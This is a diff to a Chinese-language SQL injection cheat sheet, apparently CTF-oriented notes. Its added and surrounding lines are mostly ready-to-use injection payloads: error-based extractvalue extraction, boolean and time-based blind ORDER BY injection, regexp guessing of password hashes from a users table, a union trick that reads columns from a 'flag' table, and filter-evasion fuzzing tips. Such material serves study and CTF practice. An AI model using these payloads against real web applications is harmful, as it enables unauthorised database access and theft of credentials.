@@ -578,6 +578,14 @@ like 5,BENCHMARK(5000000,SHA1(1)),1))))),1);
 
 **Order by 注入**
 
+报错
+
+```
+1 and extractvalue(1, concat(0x7e, (select @@version),0x7e))
+```
+
+
+
 ```
 /?order=IF(1=1,name,price) 通过name字段排序
 /?order=IF(1=2,name,price) 通过price字段排序
@@ -597,9 +605,20 @@ like 5,BENCHMARK(5000000,SHA1(1)),1))))),1);
 利用extractvalue 
 /?order=extractvalue(1,if(1=1,1,user())) 正确 
 /?order=extractvalue(1,if(1=2,1,user())) 错误 
+```
+盲注
+
+```
+order by IF((bool),1,(select 1 union select 2))
+```
+
+```
 sleep
 /?order=if(1=1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) 正常响应时间
 /?order=if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) sleep 2秒
+```
+
+```
 数据猜解
 通过下可以得知user()第一位为r,ascii码的16进制为0x72：
 /?order=(select+1+regexp+if(substring(user(),1,1)=0x72,1,0x00)) 正确
@@ -741,7 +760,18 @@ and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from inform
 
 ##### 布尔盲注
 
-结合 and 进行逻辑判断
+正则猜解
+
+```sql
+select (select user_pass from users where user_id = 1) regexp '^a'  -- 前往后匹配
+select (select user_pass from users where user_id = 1) regexp 'a$'  -- 后往前
+```
+
+```
+'=' <--> 'like' <--> 'in' --> 'regexp' <--> 'rlike' --> '>' <--> '<'
+```
+
+
 
 效率太低，写脚本爆
 
@@ -805,8 +835,8 @@ and exists(select * from amdin)
 
 检测被过滤的关键词：
 
-+ fuzz 一波 ASCII 码
-
++ fuzz 一波 ASCII 码（特殊字符）
++ fuzz sql 所有关键词
 + id = 1 ^ (length(‘xxx’)=3)
 
 #### 空格
@@ -839,7 +869,6 @@ and exists(select * from amdin)
     MSSQL 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20
     ```
 
-    
 
 #### 引号
 
@@ -949,7 +978,17 @@ id=0e1union
 
 别名 `information_schema.(partitions),(statistics),(keycolumnusage),(table_constraints)`
 
+#### 列名
 
++ 别名
+
+```
+union (select 1,2,c from (select 1,2 c union select * from flag)b) limit 1,1
+```
+
++ 变量
+
+需要一个请求两个注入？
 
 #### 注释符
 
@@ -960,6 +999,8 @@ id=0e1union
 #### 等号
 
 使用 `like 、rlike 、regexp` 或者  `< , >`
+
+
 
 ### 杂项
 
